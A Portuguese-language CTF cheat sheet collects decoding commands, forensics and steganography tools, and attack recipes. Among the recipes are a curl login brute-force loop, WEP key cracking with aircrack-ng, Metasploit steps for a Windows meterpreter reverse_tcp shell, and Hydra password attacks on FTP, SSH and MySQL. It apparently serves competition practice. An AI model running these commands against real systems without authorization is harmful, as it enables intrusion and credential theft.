# CTFHelp

	PARA CTFs

	CRYPTOGRAFIA:
	cifra | base64 -d
	cifra | base32 -d
	00000000: cifra | xxd -r -p
    https://cryptii.com/
    https://cryptii.com/pipes/hex-decoder
	http://endoffile.umforum.net/h4-identifcador-hash - identificar uma hash
	https://md5hashing.net/  - hash md5
	https://hashtoolkit.com/
	https://morsecode.scphillips.com/translator.html - morse
	HASH MD5: https://hashkiller.co.uk/
	QR-CODE: https://webqr.com/
	https://www.dcode.fr/tools-list
        https://codebeautify.org/
	https://upload.wikimedia.org/wikipedia/commons/thumb/9/9a/Vigen%C3%A8re_square_shading.svg/320px-Vigen%C3%A8re_square_shading.svg.png	

	REVERSE ENGENNIRING:
	ltrace para reverse
	gdb program -> disas main
	
	FORENSE:
	https://incoherency.co.uk/image-steganography/ - imagem sobre posta
	http://exif.regex.info/exif.cgi  - exif em fotos ou exif imagem
	steghide extract -sf img.jpg
        foremost -i arquivo
        data-text-file contains "flag"->pcap foremost -d jpeg -i arquivo.pcap
	https://futureboy.us/stegano/decinput.html
	hexdump -C imagem.jpg
	strings imagem.jpg
	https://md5decrypt.net/en/  

	WEB:
	ERRO DE FLASH: http://www.showmycode.com/
	/robots.txt
        /checklogin.php.bkp
        inspecionar elemento - copy url login=true - curl -X POST urlcomlogin=true -- insecure --data "username=flag&password=flag"
        while read pass;do echo $pass;curl -X POST urlcomlogin=true -- insecure --data "username=flag&password=flag" | grep shellter{;done < /usr/share/wordlists/

	aircrack-ng arquivo.pcap - para pegar o macaddress
	airdecap-ng -w macaddress arquivo.pcap - WEP key em hexadecimal
	wireshark arquivor-dec.pcap
	data-text-lines contains "post"
	tcp stream

	https://diegoandrade.com.br/ferramentas.html
	
	SENHAS:
	crunch [size min] [size max] caracteres
	crunch 8 8 abcdefghijk1234567 -t(template) [% - digito][@ - caracter][nome fixo] -o(saida) dicionario.txt
	
	METASPLOIT:
	db_status
	db_nmap
	search falha
	use /../payload
	show options
	set LHOST ipalvo
	set LPORT porta
	set payload /windows/meterpreter/reverse_tcp
	show options
	set LHOST ipinvasor
	exploit
	sessions -l
	sessions -i [num]
	?
	
	Hydra:
	hydra –L /tmp/wordlist.txt -P /tmp/wordlist.txt 192.168.0.101 ftp
	hydra –L /tmp/wordlist.txt -P /tmp/wordlist.txt 192.168.0.101 ssh
	hydra –L /tmp/wordlist.txt -P /tmp/wordlist.txt 192.168.0.101 mysql
	hydra –l admin -P /tmp/wordlist.txt 192.168.0.101 ftp
